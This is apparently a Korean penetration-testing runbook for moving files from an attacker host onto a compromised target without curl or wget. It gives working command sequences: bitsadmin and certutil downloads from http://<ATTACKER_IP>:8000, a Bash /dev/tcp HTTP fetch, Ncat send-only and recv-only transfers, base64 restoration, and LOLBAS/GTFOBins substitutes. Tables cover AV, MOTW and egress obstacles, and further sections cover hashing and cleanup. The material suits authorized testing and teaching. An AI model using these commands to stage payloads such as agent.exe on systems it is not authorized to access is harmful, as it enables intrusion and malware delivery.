# 제한 환경 파일 반입

## 한 줄 판단

현재 대상 셸에 파일을 쓸 수 있지만 `curl`, `wget`, SMB 같은 표준 반입 경로를 사용할 수 없다면, 대상에 이미 있는 인코더·런타임·Ncat·운영체제 명령 중 실제 통신 가능한 방법으로 공격 호스트의 파일을 대상에 복원한다. raw/base64 변형과 같은 손상 가능성을 판단해야 하는 이 문서의 경로에서는 양쪽 hash 비교를 유지한다.

표준 다운로드 도구가 없거나 차단됐지만 작은 도구·스크립트를 문자열로 전달할 수 있고, AV·프록시·권한 제약에 맞게 전송 방식을 바꿔야 할 때 사용한다.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 사용 가능 도구 | `which`, `where`, PowerShell | 대체 전송 명령 존재 |
| 파일 크기 | `wc -c`, `dir` | base64/클립보드 가능 범위 |
| 무결성 확인 | hash/크기 | 복원 후 일치 |

## 실행

### 방식 선택

| 현재 실행 환경과 통신 조건 | 선택 방식 | 필요한 입력 | 완료 기준 |
|---|---|---|---|
| 작은 파일의 base64 문자열을 터미널·클립보드로 전달 가능 | base64 인코딩과 복원 | 원본 파일, 문자열을 전달할 채널, 대상 쓰기 경로 | 복원 파일의 크기와 SHA-256 일치 |
| Windows 대상에서 HTTP 연결과 `certutil` 사용 가능 | [[Certutil로 Windows HTTP 파일 반입]] | 공격 호스트 HTTP URL, 대상 저장 경로 | 명령 성공 뒤 대상 파일 hash 일치 |
| Windows 대상에서 BITS 서비스와 `bitsadmin` 사용 가능 | BITS 다운로드 | 공격 호스트 HTTP URL, 절대 대상 경로 | transfer 완료 뒤 대상 파일 hash 일치 |
| Linux Bash에서 공격 호스트 HTTP 포트로 TCP 연결 가능하지만 HTTP client가 없음 | Bash `/dev/tcp` | 공격 호스트 주소·포트, 요청 경로, 대상 저장 경로 | HTTP header를 제외한 파일 hash 일치 |
| Linux 대상에 Python 3은 있지만 `curl`·`wget`이 없음 | Python 표준 라이브러리 HTTP 다운로드 | 공격 호스트 HTTP URL, 대상 저장 경로 | [[Linux HTTP 파일 반입]]의 요청 로그와 양쪽 hash 일치 |
| 양쪽에 Nmap Ncat이 있고 한쪽에서 TCP listener를 열 수 있음 | Ncat 단방향 byte stream | 원본 파일, listener 주소·포트, 대상 저장 경로 | 연결 종료 뒤 양쪽 hash 일치 |

각 방식은 대체 경로다. 모두 연속 실행하지 않고 대상에 존재하는 명령과 실제 outbound 경로에 맞는 하나를 선택한다.

### Linux 셸에서 base64 인코딩과 복원

`<SOURCE_FILE>`은 공격 호스트의 읽기 가능한 원본 절대 경로(가상 예: `/tmp/agent.bin`), `<BASE64>`는 첫 block에서 만든 단일 행 문자열, `<DESTINATION_FILE>`은 대상의 작업 전 존재하지 않는 절대 경로(가상 예: `/tmp/agent.bin`)다. base64 변형 여부가 복원 판단을 바꾸므로 원본-수신본 hash 비교를 유지한다.

#### 원본을 보유한 호스트에서 인코딩

```bash
base64 -w0 <SOURCE_FILE>
```

확인할 출력:

- 줄바꿈 없는 base64 문자열. 이 문자열 자체는 전송 완료나 파일 실행 성공을 뜻하지 않는다.

#### 파일을 만들 대상 호스트에서 복원

```bash
test ! -e '<DESTINATION_FILE>'
echo '<BASE64>' | base64 -d > '<DESTINATION_FILE>'
```

확인할 출력:

- `<DESTINATION_FILE>`이 생성되고 원본과 크기·SHA-256이 일치한다.
- decode 오류나 hash 불일치가 나오면 문자열 줄바꿈, 문자셋, padding 변형을 확인한다.

### Windows 대상 셸에서 `certutil` 다운로드

HTTP 서버 준비, 일반 Windows 셸과 `xp_cmdshell` 문법, SHA-256 확인과 cache 복구는 [[Certutil로 Windows HTTP 파일 반입]]에서 수행한다.

### Windows 대상 셸에서 `bitsadmin` 다운로드

`<DESTINATION_ABSOLUTE_PATH>`은 Windows 대상의 새 절대 경로(가상 예: `C:\Temp\agent.exe`), `<BITS_JOB_NAME>`은 기존 job과 겹치지 않는 이름이며, `<ATTACKER_IP>`·`<SOURCE_FILE>`은 공격 호스트 HTTP listener와 제공 파일을 뜻한다.

실행 위치: BITS 서비스와 `bitsadmin`을 사용할 수 있고 공격 호스트의 HTTP 포트에 연결할 수 있는 Windows 대상 셸.

```cmd
if exist "<DESTINATION_ABSOLUTE_PATH>" exit /b 1
bitsadmin /list /verbose
bitsadmin /transfer <BITS_JOB_NAME> http://<ATTACKER_IP>:8000/<SOURCE_FILE> "<DESTINATION_ABSOLUTE_PATH>"
```

확인할 출력:

- transfer 완료 메시지와 절대 대상 경로의 파일 생성.
- job 또는 서비스 오류이면 BITS 상태와 명령 가용성을, URL 오류이면 HTTP listener와 outbound 도달성을 확인한다.

### Linux 대상 셸에서 `/dev/tcp`로 수신

실행 위치: Bash의 `/dev/tcp` 기능을 사용할 수 있고 공격 호스트의 TCP 8000번 포트에 연결할 수 있는 Linux 대상 셸.

```bash
test ! -e '<DESTINATION_FILE>'
exec 3<>/dev/tcp/<ATTACKER_IP>/8000
printf 'GET /<SOURCE_FILE> HTTP/1.0\r\nHost: <ATTACKER_IP>\r\n\r\n' >&3
while IFS= read -r line <&3; do
  [[ "$line" == $'\r' ]] && break
done
cat <&3 > '<DESTINATION_FILE>'
exec 3>&- 3<&-
```

확인할 출력:

- HTTP header가 제거된 파일의 크기와 hash.
- `/dev/tcp` 열기 단계에서 실패하면 Bash 기능 지원 여부와 `<ATTACKER_IP>:8000` 도달성을 확인하고, 파일은 생겼지만 hash가 다르면 HTTP header 제거와 중단 전송을 확인한다.

### Ncat으로 Linux 대상에 단일 파일 반입

`<SOURCE_FILE>`은 공격 호스트 원본 절대 경로, `<ATTACKER_IP>`·`<PORT>`는 listener IP·TCP 포트, `<NCAT_LISTENER_PID>`는 `$!`에서 기록한 PID다. 대상의 `<DESTINATION_FILE>`은 새 절대 경로이며 raw byte stream 동일성이 완료·복구 판단을 바꾸므로 양쪽 SHA-256 비교를 유지한다.

실행 위치: 공격 호스트와 Linux 대상에 Nmap Ncat이 있고, 대상에서 공격 호스트의 `<PORT>`로 연결할 수 있는 경우다. Ncat은 기본적으로 평문이므로 기밀성이 필요한 파일은 SSH·HTTPS를 선택하거나 [[openssl]]로 만든 전송용 암호화 사본을 사용한다. traditional·OpenBSD netcat은 옵션이 다르므로 이 명령에 섞지 않는다.

공격 호스트에서 listener가 먼저 시작되어야 한다. 원본 SHA-256, 빈 포트와 이번 PID를 기록한다.

```bash
sha256sum '<SOURCE_FILE>'
ss -ltnp 'sport = :<PORT>'
ncat --listen <ATTACKER_IP> <PORT> --send-only < '<SOURCE_FILE>' &
NCAT_LISTENER_PID=$!
ps -p "$NCAT_LISTENER_PID" -o pid=,args=
```

Linux 대상에서 기존 파일을 덮어쓰지 않고 수신한다.

```bash
test ! -e '<DESTINATION_FILE>'
ncat <ATTACKER_IP> <PORT> --recv-only > '<DESTINATION_FILE>'
sha256sum '<DESTINATION_FILE>'
```

`--send-only`는 입력 EOF 뒤 송신 연결을 닫으므로 대상 명령이 종료되어야 한다. 대상 명령이 계속 대기하면 양쪽이 모두 Nmap Ncat인지, 송신 쪽 `--send-only`, 주소·포트와 실제 연결 상태를 확인한다. 연결이 종료되어도 양쪽 SHA-256이 다르면 완료가 아니다.

### 설치된 대체 바이너리 선택

표준 client와 위 대표 경로를 사용할 수 없을 때만 현재 호스트에 이미 있는 바이너리를 확인한다. Windows는 `Get-Command <BINARY>`, Linux는 `command -v <BINARY>`와 버전으로 실제 존재를 확인한 뒤 LOLBAS의 `Download`·`Upload` 또는 GTFOBins의 `File download`·`File upload` 기능에서 현재 binary·version에 맞는 항목을 선택한다.

인덱스에 같은 이름이 있다는 사실만으로 현재 호스트의 binary가 그 옵션을 지원하거나 보안 제어를 통과한다고 판단하지 않는다. 오래된 별도 binary를 내려받아 이 분기를 만들지 않고, 실행 위치·통신 방향·목적지 덮어쓰기·hash·생성 process를 해당 항목의 명령 가까이에서 다시 확인한다.

### 대상 호스트에서 전송 무결성 비교

#### Linux 대상 호스트

```bash
wc -c <SOURCE_FILE> <DESTINATION_FILE>
sha256sum <SOURCE_FILE> <DESTINATION_FILE>
```

#### Windows 대상 호스트

```powershell
Get-Item <DESTINATION_FILE> | Select-Object Length
Get-FileHash <DESTINATION_FILE> -Algorithm SHA256
```

```cmd
certutil -hashfile <DESTINATION_FILE> SHA256
```

확인할 출력:

- 송신 전후 파일 크기와 SHA-256이 모두 일치한다.
- 원본 hash를 직접 비교할 수 없으면 수신 파일의 크기와 hash를 확인하고, 파서 또는 서명 검증으로 손상 여부를 추가 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 대체 도구로 파일이 생성되고 송신본·수신본 크기와 SHA-256이 일치함 | 반입과 복원이 정상 완료됨 | 파일 반입 | 실행 전 OS·arch와 파일 권한 확인 |
| 파일은 생겼지만 hash가 다름 | 줄바꿈, HTTP header, 텍스트 변환 또는 중단 전송이 발생함 | 손상된 파일 | 실행하지 말고 binary-safe 방식으로 재전송 |
| base64 decode가 실패하거나 크기가 다름 | 줄바꿈·문자셋·padding이 변형됨 | 복원 실패 | 단일 행 인코딩과 PowerShell byte decode 확인 |
| 내장 명령이 없음 | 최소 설치 환경임 | 현재 방식 사용 불가 | python, php, perl, ruby, awk, openssl 중 사용 가능한 runtime 확인 |
| 명령은 있지만 연결이 실패함 | proxy, DNS 또는 egress 정책 문제 | 저장 경로만 확보 | [[상황별 파일 전송]]에서 SMB·RDP·WinRM 내부 경로 재선택 |
| 파일은 정상이나 실행이 거부됨 | 실행 권한, MOTW, 정책 또는 AV 문제 | 파일 반입만 완료 | 실행 권한과 차단 원인을 별도 판단 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 저장 경로 | 파일 존재, 크기, 소유자·ACL | 현재 세션이 파일을 생성·읽을 수 있는지 확인 |
| 무결성 | 송신본·수신본 SHA-256 일치 | 파일 존재와 정상 복원을 구분 |
| 실행 조건 | OS·arch, 실행 bit, MOTW·정책·AV 반응 | 반입 성공과 실행 권한을 구분 |
| 반입 조건 | 공격 호스트의 원본 hash와 대상에 생성된 파일 hash | 전송 중 변형되지 않았는지 확정 |

## 변경 영향과 복구

선택한 방식 하나가 만든 대상 파일과, BITS 방식이 실패·중단되며 남긴 job만 정리한다. 공격 호스트의 HTTP listener는 이 문서에서 시작하지 않으므로 실제로 사용한 listener 문서의 PID 기준 복구를 따른다.

| 생성 항목 | 기존 상태·식별값 | 정리 명령 | 완료 확인 |
|---|---|---|---|
| base64 또는 `/dev/tcp` 복원 파일 | `test ! -e '<DESTINATION_FILE>'`와 전송 후 SHA-256 | 사용 process를 먼저 종료한 뒤 Linux 대상에서 `rm -- '<DESTINATION_FILE>'` | `test ! -e '<DESTINATION_FILE>'` 성공 |
| BITS 대상 파일 | 실행 전 `if exist` 결과, `<DESTINATION_ABSOLUTE_PATH>`와 SHA-256 | 사용 process 종료 뒤 Windows 대상에서 `del "<DESTINATION_ABSOLUTE_PATH>"` | `if exist "<DESTINATION_ABSOLUTE_PATH>" echo REMAINS`가 출력되지 않음 |
| 미완료 BITS job | 실행 전 `bitsadmin /list /verbose`, 고유한 `<BITS_JOB_NAME>`과 목록에 표시된 job ID | 전송 실패·중단 후 목록에 남아 있을 때만 `bitsadmin /cancel <BITS_JOB_NAME>` | `bitsadmin /list /verbose`에 기록한 이름·ID가 없음 |
| Ncat 대상 파일 | 실행 전 `test ! -e '<DESTINATION_FILE>'`, 수신 뒤 SHA-256 | 사용 process 종료 뒤 대상에서 `rm -- '<DESTINATION_FILE>'` | `test ! -e '<DESTINATION_FILE>'` 성공 |
| Ncat 송신 listener | 실행 전 빈 `<PORT>`, `<NCAT_LISTENER_PID>`와 command line | 대상 파일 정리 또는 보존 판정 뒤 process가 남아 있을 때만 `kill <NCAT_LISTENER_PID>` | 기록한 PID가 없고 포트가 작업 전 상태로 복귀 |

성공한 `/transfer` 뒤 job이 목록에 없다면 별도 cancel을 실행하지 않는다. `<BITS_JOB_NAME>`이 기존 job과 겹치거나 대상 경로가 이미 존재하면 실행하지 않는다. `/dev/tcp` 실패 시 먼저 file descriptor 3을 닫고 부분 파일이 이번 실행에서 생성된 exact 경로인지 확인한 뒤 제거한다. Ncat listener가 단일 연결 뒤 이미 종료됐으면 `kill`하지 않고, PID가 남아 있을 때도 command line을 대조해 다른 process를 종료하지 않는다.
